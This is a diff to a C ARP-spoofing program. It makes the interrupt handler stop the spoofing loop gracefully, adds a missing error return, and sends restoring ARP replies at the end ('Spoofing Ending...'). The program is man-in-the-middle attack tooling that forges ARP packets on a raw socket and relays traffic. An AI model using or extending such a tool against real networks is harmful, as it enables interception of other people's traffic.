@@ -1,7 +1,8 @@
 #include "protocol.h"
-
 #define TIME_SEC 1
 enum {INDEX, HWADDR, ADDR};
+
+int g_signal_fleg;
 
 struct thread_arg
 {
@@ -95,6 +96,7 @@ int main(int argc, char **argv)
     pthread_join(thread_id, (void **)&arp_data);
     
     if(arp_data == NULL)
+        return -1;
     
     pthread_create(&thread_id, NULL, thread_relay, arp_data->host_mac);
 
@@ -106,8 +108,21 @@ int main(int argc, char **argv)
     {
         if((len = sendto(sock, buffer, ARPMAX,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
             perror("sendto");
+        if(g_signal_fleg)
+            break;
         sleep(1);
     }
+
+    buffer = make_arp_reply_packet(arp_data->host_mac ,host_ip ,arp_data->target_mac ,target_ip);
+    
+    printf("Spoofing Ending...\n");
+    for(int i=0; i<3 ; i++)
+    {
+        if((len = sendto(sock, buffer, ARPMAX,0,(struct sockaddr*)&sll,sizeof(sll)))<0)
+            perror("sendto");
+        sleep(1);
+    }
+    
 
     free(arp_data);
     close(sock);
@@ -179,11 +194,7 @@ void *thread_relay(void *p)
 
 void INThandler(int sig)
 {
-    int sock;
-    uint8_t *buffer;
-
     signal(sig, SIG_IGN);
 
-    exit(0); 
-    
+    g_signal_fleg = 1;
 }
